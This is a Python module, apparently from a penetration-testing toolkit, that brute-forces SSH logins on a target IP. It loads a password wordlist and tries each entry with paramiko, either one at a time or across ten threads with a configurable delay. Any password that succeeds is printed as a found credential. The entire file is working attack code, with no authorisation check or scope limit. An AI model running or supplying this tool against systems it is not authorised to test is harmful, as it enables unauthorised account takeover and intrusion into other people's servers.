# SSH Brute Force

from .progress import ProgressUpdater
import os
import time
from threading import Thread, Lock, Event
from queue import Queue, Empty
import paramiko
import socket
import config as conf

def TrySsh(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(ip, username=username, password=password, timeout=3)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except socket.timeout:
        return False
    except Exception:
        return False
    finally:
        try:
            client.close()
        except:
            pass

def BruteForceSlow(ip, username, passwords):
    updater = ProgressUpdater(len(passwords))
    updater.start()

    for password in passwords:
        success = TrySsh(ip, username, password)
        updater.increment()

        if success:
            updater.stop()
            return f"{username}:{password}"

    updater.stop()
    return None

def BruteForceCustom(ip, username, passwords, threadCount=10, delay=0.1):
    passwordQueue = Queue()
    for pwd in passwords:
        passwordQueue.put(pwd)

    found = {"status": False, "credential": None}
    lock = Lock()
    stopEvent = Event()

    updater = ProgressUpdater(len(passwords))
    updater.start()

    def worker():
        nonlocal found

        while not stopEvent.is_set():
            try:
                password = passwordQueue.get_nowait()
            except Empty:
                break  # No more passwords

            if stopEvent.is_set():
                passwordQueue.put(password)
                break

            success = TrySsh(ip, username, password)
            updater.increment()

            if success:
                with lock:
                    if not found["status"]:
                        found["status"] = True
                        found["credential"] = f"{username}:{password}"
                        stopEvent.set()
                break

            passwordQueue.task_done()
            time.sleep(delay)

    threads = []
    for _ in range(threadCount):
        t = Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    updater.stop()
    return found["credential"]

def BruteForceSsh(ip, username, passwordFile, mode="slow", reportFormat="pdf", baseDir=None, delay=0.1):
    print(f"\n{conf.BOLD}Starting SSH Brute Force on {ip} with username '{username}' in {mode.upper()} mode.\n{conf.RESET}")

    tool_dir    = os.path.dirname(__file__)
    modules_dir = os.path.dirname(tool_dir)

    if os.path.isabs(passwordFile):
        password_path = passwordFile
    else:
        password_path = os.path.join(modules_dir, passwordFile)

    if not os.path.isfile(password_path):
        print(f"[!] Password file not found: {password_path}")
        return

    try:
        with open(password_path, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[!] Error reading password file: {e}")
        return

    if mode == "fast":
        result = BruteForceCustom(ip, username, passwords, delay=delay)
    else:
        result = BruteForceSlow(ip, username, passwords)

    if result:
        print(f"{conf.RED}\n\n[+] Credential found: {conf.RESET}{conf.BOLD}{result}{conf.RESET}")
    else:
        print(f"\n{conf.RED}[-] No valid credentials found.{conf.RESET}")
